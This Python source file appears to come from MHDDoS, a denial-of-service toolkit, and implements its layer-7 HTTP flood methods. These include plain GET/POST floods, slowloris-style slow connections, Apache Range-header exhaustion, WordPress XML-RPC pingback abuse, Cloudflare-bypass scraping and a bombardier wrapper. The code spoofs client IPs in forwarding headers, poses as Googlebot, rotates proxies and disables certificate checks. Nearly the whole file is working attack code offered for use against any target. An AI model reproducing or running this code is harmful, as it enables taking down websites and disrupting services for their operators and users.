"""
Implementations of layer 7 attack methods of MHDDoS.
"""

import subprocess
# noinspection PyBroadException
from contextlib import suppress
from pathlib import Path
from random import choice, randint
from socket import (AF_INET, IPPROTO_TCP, SOCK_STREAM, TCP_NODELAY, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
from threading import Thread, Event
from time import sleep
from typing import List, Any, Set
from urllib import parse

import PyRoxy
from PyRoxy import Proxy
from certifi import where
from cfscrape import create_scraper
from requests import Session
from yarl import URL

from MHDDoS.methods.tools import Tools
from MHDDoS.utils.misc import Counter

CTX: SSLContext = create_default_context(cafile=where())
CTX.check_hostname = False
CTX.verify_mode = CERT_NONE

GOOGLE_AGENTS = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) "
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
]


class Layer7(Thread):
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any
    _requests_sent: Counter = None
    _bytes_sent: Counter = None

    def __init__(self,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: List[str] = None,
                 referers: List[str] = None,
                 proxies: List[Proxy] = None,
                 bytes_sent_counter: Counter = None,
                 requests_sent_counter: Counter = None):
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        if not referers:
            referers: List[str] = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u="
            ]
        self._referers = list(referers)
        if proxies:
            self._proxies = list(proxies)

        if not useragents:
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
            ]
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                      target.raw_path_qs, choice(['1.0', '1.1', '1.2']))
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: Keep-Alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

        self._requests_sent = requests_sent_counter
        self._bytes_sent = bytes_sent_counter

    def run(self) -> None:
        if self._synevent:
            self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            with suppress(Exception):
                while self._synevent.is_set():
                    self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = PyRoxy.Tools.Random.rand_ipv4()
        payload: str = ""
        payload += "X-Forwarded-Proto: Http\r\n"
        payload += f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
        payload += f"Via: {spoof}\r\n"
        payload += f"Client-IP: {spoof}\r\n"
        payload += f'X-Forwarded-For: {spoof}\r\n'
        payload += f'Real-IP: {spoof}\r\n'
        return payload

    def generate_payload(self, other: str = None) -> bytes:
        payload: str | bytes = self._payload
        payload += "Host: %s\r\n" % self._target.authority
        payload += self.randHeadercontent
        payload += other if other else ""
        return str.encode(f"{payload}\r\n")

    def open_connection(self) -> socket:
        if self._proxies:
            sock = choice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket()

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.connect(self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = CTX.wrap_socket(sock,
                                   server_hostname=self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    @property
    def randHeadercontent(self) -> str:
        payload: str = ""
        payload += f"User-Agent: {choice(self._useragents)}\r\n"
        payload += f"Referrer: {choice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
        payload += self.SpoofIP
        return payload

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "COOKIE", "OVH", "EVEN",
                                            "STRESS", "DYN", "SLOW", "PPS", "APACHE",
                                            "BOT", } \
            else "POST" if {method.upper()} & {"POST", "XMLRPC"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "REQUESTS"

    def POST(self) -> None:
        # global BYTES_SENT, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            ("Content-Length: 44\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % PyRoxy.Tools.Random.rand_str(32))[:-2]
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def STRESS(self) -> None:
        # global BYTES_SENT, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            (f"Content-Length: 524\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % PyRoxy.Tools.Random.rand_str(512))[:-2]
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def COOKIES(self) -> None:
        # global BYTES_SENT, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n" %
            (randint(1000, 99999), PyRoxy.Tools.Random.rand_str(6),
             PyRoxy.Tools.Random.rand_str(32)))
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def APACHE(self) -> None:
        # global BYTES_SENT, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i
                                            for i in range(1, 1024)))
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def XMLRPC(self) -> None:
        # global BYTES_SENT, REQUESTS_SENT
        payload: bytes = self.generate_payload(
            ("Content-Length: 345\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/xml\r\n\r\n"
             "<?xml version='1.0' encoding='iso-8859-1'?>"
             "<methodCall><methodName>pingback.ping</methodName>"
             "<params><param><value><string>%s</string></value>"
             "</param><param><value><string>%s</string>"
             "</value></param></params></methodCall>") %
            (PyRoxy.Tools.Random.rand_str(64),
             PyRoxy.Tools.Random.rand_str(64)))[:-2]
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def PPS(self) -> None:
        # global BYTES_SENT, REQUESTS_SENT
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(self._defaultpayload):
                        self._requests_sent += 1
                        self._bytes_sent += len(self._defaultpayload)
        except Exception:
            s.close()

    def GET(self) -> None:
        # global BYTES_SENT, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def BOT(self) -> None:
        # global BYTES_SENT, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % choice(GOOGLE_AGENTS) +
            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % choice(GOOGLE_AGENTS) +
            "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n" % (PyRoxy.Tools.Random.rand_str(9),
                                          PyRoxy.Tools.Random.rand_str(4)) +
            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
        try:
            with self.open_connection() as s:
                s.send(p1)
                s.send(p2)
                self._bytes_sent += len(p1 + p2)
                self._requests_sent += 2

                for _ in range(self._rpc):
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def EVEN(self) -> None:
        # global BYTES_SENT, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                while s.send(payload) and s.recv(1):
                    self._requests_sent += 1
                    self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def OVH(self) -> None:
        # global BYTES_SENT, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(min(self._rpc, 5)):
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def CFB(self):
        pro = None
        # global BYTES_SENT, REQUESTS_SENT
        if self._proxies:
            pro = choice(self._proxies)
        try:
            with create_scraper() as s:
                for _ in range(self._rpc):
                    if pro:
                        with s.get(self._target.human_repr(),
                                   proxies=pro.asRequest()) as res:
                            self._requests_sent += 1
                            self._bytes_sent += Tools.sizeOfRequest(res)
                            continue

                    with s.get(self._target.human_repr()) as res:
                        self._requests_sent += 1
                        self._bytes_sent += Tools.sizeOfRequest(res)
        except Exception:
            s.close()

    def CFBUAM(self):
        # global BYTES_SENT, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                sleep(5.01)
                for _ in range(self._rpc):
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def AVB(self):
        # global BYTES_SENT, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    sleep(max(self._rpc / 1000, 1))
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def DGB(self):
        # global BYTES_SENT, REQUESTS_SENT
        with create_scraper() as s:
            try:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    if self._proxies:
                        pro = choice(self._proxies)
                        with s.get(self._target.human_repr(),
                                   proxies=pro.asRequest()) as res:
                            self._requests_sent += 1
                            self._bytes_sent += Tools.sizeOfRequest(res)
                            continue

                    with s.get(self._target.human_repr()) as res:
                        self._requests_sent += 1
                        self._bytes_sent += Tools.sizeOfRequest(res)
            except Exception:
                s.close()

    def DYN(self):
        # global BYTES_SENT, REQUESTS_SENT
        payload: str | bytes = self._payload
        payload += "Host: %s.%s\r\n" % (PyRoxy.Tools.Random.rand_str(6),
                                        self._target.authority)
        payload += self.randHeadercontent
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def DOWNLOADER(self):
        # global BYTES_SENT, REQUESTS_SENT
        payload: str | bytes = self._payload
        payload += "Host: %s.%s\r\n" % (PyRoxy.Tools.Random.rand_str(6),
                                        self._target.authority)
        payload += self.randHeadercontent
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
                        while 1:
                            sleep(.01)
                            data = s.recv(1)
                            if not data:
                                break
                s.send(b'0')
                self._bytes_sent += 1

        except Exception:
            s.close()

    def BYPASS(self):
        global REQUESTS_SENT, BYTES_SENT
        pro = None
        if self._proxies:
            pro = choice(self._proxies)
        try:
            with Session() as s:
                for _ in range(self._rpc):
                    if pro:
                        with s.get(self._target.human_repr(),
                                   proxies=pro.asRequest()) as res:
                            self._requests_sent += 1
                            self._bytes_sent += Tools.sizeOfRequest(res)
                            continue

                    with s.get(self._target.human_repr()) as res:
                        self._requests_sent += 1
                        self._bytes_sent += Tools.sizeOfRequest(res)
        except Exception:
            s.close()

    def GSB(self):
        # global BYTES_SENT, REQUESTS_SENT
        payload = "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                self._target.raw_path_qs,
                                                PyRoxy.Tools.Random.rand_str(6))
        payload = (payload + 'Accept-Encoding: gzip, deflate, br\r\n'
                             'Accept-Language: en-US,en;q=0.9\r\n'
                             'Cache-Control: max-age=0\r\n'
                             'Connection: Keep-Alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n')
        payload += "Host: %s\r\n" % self._target.authority
        payload += self.randHeadercontent
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def NULL(self) -> None:
        # global BYTES_SENT, REQUESTS_SENT
        payload: str | bytes = self._payload
        payload += "Host: %s\r\n" % self._target.authority
        payload += "User-Agent: null\r\n"
        payload += "Referrer: null\r\n"
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    if s.send(payload):
                        self._requests_sent += 1
                        self._bytes_sent += len(payload)
        except Exception:
            s.close()

    def SLOW(self):
        # global BYTES_SENT, REQUESTS_SENT
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(payload)
                while s.send(payload) and s.recv(1):
                    for i in range(self._rpc):
                        keep = str.encode("X-a: %d\r\n" % randint(1, 5000))
                        if s.send(keep):
                            sleep(self._rpc / 15)
                            self._requests_sent += 1
                            self._bytes_sent += len(keep)
                    break
        except Exception:
            s.close()

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        if name == "POST":
            self.SENT_FLOOD = self.POST
        if name == "CFB":
            self.SENT_FLOOD = self.CFB
        if name == "CFBUAM":
            self.SENT_FLOOD = self.CFBUAM
        if name == "XMLRPC":
            self.SENT_FLOOD = self.XMLRPC
        if name == "BOT":
            self.SENT_FLOOD = self.BOT
        if name == "APACHE":
            self.SENT_FLOOD = self.APACHE
        if name == "BYPASS":
            self.SENT_FLOOD = self.BYPASS
        if name == "OVH":
            self.SENT_FLOOD = self.OVH
        if name == "AVB":
            self.SENT_FLOOD = self.AVB
        if name == "STRESS":
            self.SENT_FLOOD = self.STRESS
        if name == "DYN":
            self.SENT_FLOOD = self.DYN
        if name == "SLOW":
            self.SENT_FLOOD = self.SLOW
        if name == "GSB":
            self.SENT_FLOOD = self.GSB
        if name == "NULL":
            self.SENT_FLOOD = self.NULL
        if name == "COOKIE":
            self.SENT_FLOOD = self.COOKIES
        if name == "PPS":
            self.SENT_FLOOD = self.PPS
            self._defaultpayload = (
                    self._defaultpayload +
                    "Host: %s\r\n\r\n" % self._target.authority).encode()
        if name == "EVEN":
            self.SENT_FLOOD = self.EVEN
        if name == "DOWNLOADER":
            self.SENT_FLOOD = self.DOWNLOADER
        if name == "BOMB":
            self.SENT_FLOOD = self.BOMB

    def BOMB(self):
        pro = choice(self._proxies)
        global bombardier_path

        subprocess.run([
            f'{Path.home() / "go/bin/bombardier"}',
            f'{bombardier_path}',
            f'--connections={self._rpc}',
            '--http2',
            '--method=GET',
            '--no-print',
            '--timeout=5s',
            f'--requests={self._rpc}',
            f'--proxy={pro}',
            f'{self._target.human_repr()}',
        ])
